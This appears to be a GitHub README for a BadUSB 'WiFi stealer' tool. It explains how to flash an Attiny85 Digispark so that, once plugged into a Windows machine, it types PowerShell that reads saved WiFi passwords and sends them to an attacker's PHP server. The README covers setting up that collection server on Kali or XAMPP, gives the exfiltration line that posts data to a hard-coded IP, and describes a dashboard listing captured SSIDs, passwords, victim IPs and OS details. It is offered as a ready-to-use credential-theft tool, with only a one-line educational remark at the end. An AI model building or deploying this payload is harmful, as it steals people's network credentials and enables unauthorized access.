# WiFi Stealer Dashboard

A BadUSB payload that grabs WiFi credentials from Windows machines and displays them on a web dashboard.

![Dashboard Preview](WEB_SERVER_PICTURE.png)

## What it does

- Attiny85/Digispark acts as a keyboard when plugged into Windows.
- Runs PowerShell to extract saved WiFi passwords.
- Sends everything to a PHP server on Kali or Windows.
- Shows the captured data in a simple dashboard.

---

## Setting Up the Server

You can host the dashboard on either Kali or Windows. Pick whichever you’re more comfortable with.

### On Kali Linux

```bash
# Clone the repo
cd ~
git clone https://github.com/Zypher17/wifi-stealer.git
cd wifi-stealer

# Install web server packages
sudo apt update
sudo apt install apache2 php

# Start Apache
sudo systemctl enable apache2
sudo systemctl start apache2

# Check your IP address
ip addr show | grep "inet " | grep -v 127.0.0.1

# Copy files to the web root
sudo cp index.php /var/www/html/
sudo cp wifi-recv.php /var/www/html/

# Create the log file and set permissions
sudo touch /var/www/html/wifi_creds.log
sudo chown www-data:www-data /var/www/html/{index.php,wifi-recv.php,wifi_creds.log}
sudo chmod 664 /var/www/html/wifi_creds.log
```

Make sure it works:

```bash
curl -X POST http://localhost/wifi-recv.php -d "data=test"
cat /var/www/html/wifi_creds.log
```

If you see `test` in the output, the server is working.

Open:

```text
http://YOUR_IP/index.php
```

Replace `YOUR_IP` with the IP address of your Kali machine.

---

### On Windows (XAMPP)

1. Download XAMPP from [apachefriends.org](https://www.apachefriends.org).
2. Install it with Apache and PHP selected.
3. Start Apache from the XAMPP control panel.

4. Get the project files:

```powershell
git clone https://github.com/Zypher17/wifi-stealer.git
# Or download the ZIP from GitHub if you don’t have git
```

5. Copy the PHP files to the web folder:

```powershell
Copy-Item index.php C:\xampp\htdocs\
Copy-Item wifi-recv.php C:\xampp\htdocs\
```

6. Create the log file:

```powershell
New-Item C:\xampp\htdocs\wifi_creds.log -ItemType File
icacls C:\xampp\htdocs\wifi_creds.log /grant Users:F
```

7. Find your IP:

```powershell
ipconfig
```

Look for the IPv4 address on your active adapter.

Test it:

```powershell
Invoke-WebRequest -Uri 'http://localhost/wifi-recv.php' -Method POST -Body "data=test"
Get-Content C:\xampp\htdocs\wifi_creds.log
```

Open:

```text
http://localhost/index.php
```

---

## Programming the Digispark

![Attiny85 Digispark](attiny85-digispark.jpg)

### Getting Arduino IDE ready

1. Open Arduino IDE.
2. Go to `File → Preferences`.
3. Add this to **Additional Boards Manager URLs**:

```text
http://digistump.com/package_digistump_index.json
```

4. Go to `Tools → Board → Boards Manager`.
5. Search for `Digistump AVR` and install it.
6. Select `Digispark (Default - 16.5MHz)`.

### Uploading the payload

1. Open:

```text
payloads/wifi_stealer_digispark.ino
```

2. Find this line and change the IP address:

```cpp
DigiKeyboard.print(
  F("Invoke-WebRequest -UseBasicParsing -Uri 'http://192.168.1.8/wifi-recv.php' -Method POST -Body $b")
);
```

Change `192.168.1.8` to the IP of your Kali or Windows server.

3. Click **Upload**.
4. When Arduino IDE says `Plug in device now...`, plug in the Digispark.
5. Wait for the upload to finish.

After flashing, plugging the Digispark into a Windows machine will:
- Open PowerShell.
- Read saved WiFi profiles.
- Send the captured data to your PHP receiver.
- Close out when finished.

---

## Viewing the Results

All captured data is saved in:

```text
wifi_creds.log
```

The dashboard is available at:

```text
http://YOUR_SERVER_IP/index.php
```

The dashboard shows:
- Total number of captures.
- SSIDs and passwords.
- Victim IP address.
- OS information.
- A delete option for entries.

---

## Removing the Project

If you want to remove everything, delete the files you copied earlier.

### On Kali Linux

```bash
sudo rm -f /var/www/html/index.php
sudo rm -f /var/www/html/wifi-recv.php
sudo rm -f /var/www/html/wifi_creds.log
```

If you want to remove the whole repository too:

```bash
rm -rf ~/wifi-stealer
```

### On Windows (XAMPP)

Delete these files from `C:\xampp\htdocs\`:

```text
index.php
wifi-recv.php
wifi_creds.log
```

If you cloned the repo, you can also delete the project folder you downloaded.

---

## Troubleshooting

**Dashboard won’t load:**
- Make sure Apache or XAMPP is running.
- Check that `index.php` is in the web root.
- Make sure the log file is writable.

**No data is showing up:**
- Double-check the IP in the Arduino sketch.
- Make sure the log file exists.
- Check firewall settings.

**Digispark upload fails:**
- Try a different USB port.
- Plug it in only after clicking upload.
- Install the Digispark drivers if needed.

---

## Notes
It’s meant to show how simple BadUSB-style workflows can be, and how important it is to secure systems properly.

Feel free to improve it with things like:
- Better logging.
- CSV export.
- Duplicate filtering.
- Timestamps.
